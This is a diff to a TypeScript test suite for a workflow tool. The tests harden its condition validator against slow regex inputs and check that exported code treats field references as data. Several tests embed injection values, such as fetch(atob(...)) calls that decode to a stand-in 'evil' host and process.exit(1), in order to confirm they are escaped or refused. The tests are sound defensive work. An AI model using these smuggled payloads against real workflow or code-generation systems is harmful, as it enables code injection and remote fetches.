@@ -165,22 +165,74 @@ describe("regex hardening", () => {
       expect(validateConditionExpression(resolved)).toEqual({ valid: true });
     });
 
-    // Shapes that used to take seconds: a long word, a run of spaces inside
-    // quotes, a run of "a[", and a long || chain. Quadratic would be minutes.
-    it("checks a 200,000-character condition in linear time", () => {
-      const n = 200_000;
+    // Each shape took seconds at this size before; quadratic would again.
+    it("checks a 50,000-character condition in linear time", () => {
+      const n = 50_000;
+      const timed = (run: () => unknown): number => {
+        const started = performance.now();
+        run();
+        return performance.now() - started;
+      };
       for (const text of [
         `${"a".repeat(n)} == 1`,
-        `"${" ".repeat(n)}" == __v0`,
+        `__v0 ==${" ".repeat(n)}1`,
         "a[".repeat(n / 2),
         Array.from({ length: n / 6 }, () => '"a"').join(" || "),
       ]) {
-        const started = performance.now();
-        validateConditionExpression(text);
-        preValidateConditionExpression(text);
-        validateConditionExpressionUI(text);
-        expect(performance.now() - started).toBeLessThan(2000);
+        expect(timed(() => validateConditionExpression(text))).toBeLessThan(
+          1000
+        );
+        expect(timed(() => preValidateConditionExpression(text))).toBeLessThan(
+          1000
+        );
+        expect(timed(() => validateConditionExpressionUI(text))).toBeLessThan(
+          1000
+        );
       }
+      expect(
+        timed(() => editorConditionState(`__v0${" ".repeat(n)}x`, undefined))
+      ).toBeLessThan(1000);
+    });
+
+    // The bracket check reads the content up to the first "]", as before.
+    it("still refuses nested brackets", () => {
+      for (const [condition, error] of [
+        ["__v0[__v1[0]] === 1", 'Invalid bracket content: "[__v1[0]"'],
+        ["__v0[[0]] === 1", 'Invalid bracket content: "[[0]"'],
+        ["foo__v0[__v1[0]] === 1", 'Cannot index "foo__v0[...]"'],
+      ]) {
+        expect(validateConditionExpression(condition)).toEqual({
+          valid: false,
+          error: expect.stringContaining(error),
+        });
+      }
+    });
+
+    it("caps a regex condition at exactly 10,000 characters", () => {
+      const sized = (length: number): string => {
+        const head = 'matchesRegex(__v0, "a") || __v0 === "';
+        return `${head}${"a".repeat(length - head.length - 1)}"`;
+      };
+      for (const check of [
+        preValidateConditionExpression,
+        validateConditionExpression,
+        validateConditionExpressionUI,
+      ]) {
+        expect(check(sized(10_000))).toEqual({ valid: true });
+        expect(check(sized(10_001)).valid).toBe(false);
+      }
+      // The name only inside quotes is not a regex test.
+      const quoted = `__v0 === "matchesRegex(${"a".repeat(10_000)}"`;
+      expect(validateConditionExpression(quoted)).toEqual({ valid: true });
+      // An unclosed quote is still measured.
+      expect(
+        validateConditionExpression(
+          `matchesRegex(__v0, "a") || "${"a".repeat(10_000)}`
+        )
+      ).toEqual({
+        valid: false,
+        error: expect.stringContaining("the limit is 10,000"),
+      });
     });
 
     it("shows the visual limits before a run", () => {
@@ -473,9 +525,11 @@ describe("regex hardening", () => {
     // Condition exporter then refuses it, since it is not condition grammar.
     it("writes any field path as data, never as code", () => {
       const injected = `{{@n1:Webhook.a || fetch(atob("aHR0cDovL2V2aWw")) || b}} == 1`;
-      const code = workflowCode(injected);
-      expect(code).toContain("if (false /* ERROR:");
-      expect(code).not.toContain("fetch(atob");
+      // Written as is, a Condition's key is a plain quoted string.
+      expect(workflowCode(injected)).toContain(
+        'if (webhookResult["a || fetch(atob(\\"aHR0cDovL2V2aWw\\")) || b"] == 1) {'
+      );
+      // Escaped again later as template text, it is written without quotes.
       const sdk = exported(injected);
       expect(sdk).toContain("?.data?.[String.fromCharCode(");
       expect(sdk).not.toContain("fetch(atob");
@@ -504,17 +558,20 @@ describe("regex hardening", () => {
 
     // A reference inside quotes is part of the text; it must not close them.
     it("keeps a reference inside a quoted string from closing it", () => {
-      const single = `"{{@n1:Webhook. + fetch(atob('aHR0cDovL2V2aWw')) + }}" == "x"`;
-      const double = `'{{@n1:Webhook. + fetch(atob("aHR0cDovL2V2aWw")) + }}' == "x"`;
-      for (const condition of [single, double]) {
-        expect(workflowCode(condition)).not.toMatch(/\+ fetch\(atob/);
-      }
+      const inDouble = `"{{@n1:Webhook. + fetch(atob('aHR0cDovL2V2aWw')) + }}" == "x"`;
+      const inSingle = `'{{@n1:Webhook. + fetch(atob("aHR0cDovL2V2aWw")) + }}' == "x"`;
+      // Closing the double quotes would make a call: refused.
+      expect(workflowCode(inDouble)).toContain("if (false /* ERROR:");
+      // Inside single quotes the key's double quotes are only text.
+      expect(workflowCode(inSingle)).toContain(
+        `if ('webhookResult["+ fetch(atob(\\"aHR0cDovL2V2aWw\\")) +"]' == "x") {`
+      );
       // The SDK writes the condition as template text; the key stays one
       // string inside its ${...}.
-      expect(exported(single)).toContain(
+      expect(exported(inDouble)).toContain(
         `\`"\${outputs?.['n1']?.data?.["+ fetch(atob('aHR0cDovL2V2aWw')) +"]}" == "x"\``
       );
-      expect(exported(double)).toContain(
+      expect(exported(inSingle)).toContain(
         "`'${outputs?.['n1']?.data?.[String.fromCharCode("
       );
     });
@@ -601,6 +658,38 @@ describe("regex hardening", () => {
         ] as never
       ).code;
       expect(code).not.toContain("evil: process.exit(1)");
+    });
+
+    // JavaScript reads these differently from the run: an increment, and a
+    // leading-zero number that a module refuses.
+    it("refuses ++, -- and leading-zero numbers in exported conditions", () => {
+      for (const condition of [
+        "{{@n1:Webhook.a}} ++ > 0",
+        "-- {{@n1:Webhook.a}} > 0",
+        "{{@n1:Webhook.a}} == 010",
+      ]) {
+        expect(workflowCode(condition)).toContain("if (false /* ERROR:");
+      }
+      expect(workflowCode("{{@n1:Webhook.a}} == 0.5")).toContain(
+        "if (webhookResult.a == 0.5) {"
+      );
+    });
+
+    it("writes long and odd keys as the run reads them", () => {
+      expect(workflowCode("{{@n1:Webhook.n.9007199254740993}} == 1")).toContain(
+        'webhookResult.n["9007199254740993"] == 1'
+      );
+      expect(exported("{{@n1:Webhook.a`b}} == 1")).toContain(
+        "?.data?.[String.fromCharCode(97,96,98)]"
+      );
+    });
+
+    // Condition step input is written as code, so it gets the same check.
+    it("writes a Condition step's input only when it is condition grammar", () => {
+      expect(exported("1 == 1")).toContain("condition: 1 == 1");
+      const code = exported("process.exit(1)");
+      expect(code).toContain("condition: false /* not supported");
+      expect(code).not.toContain("condition: process.exit");
     });
 
     it("exports a reference to a node whose label has dots", () => {
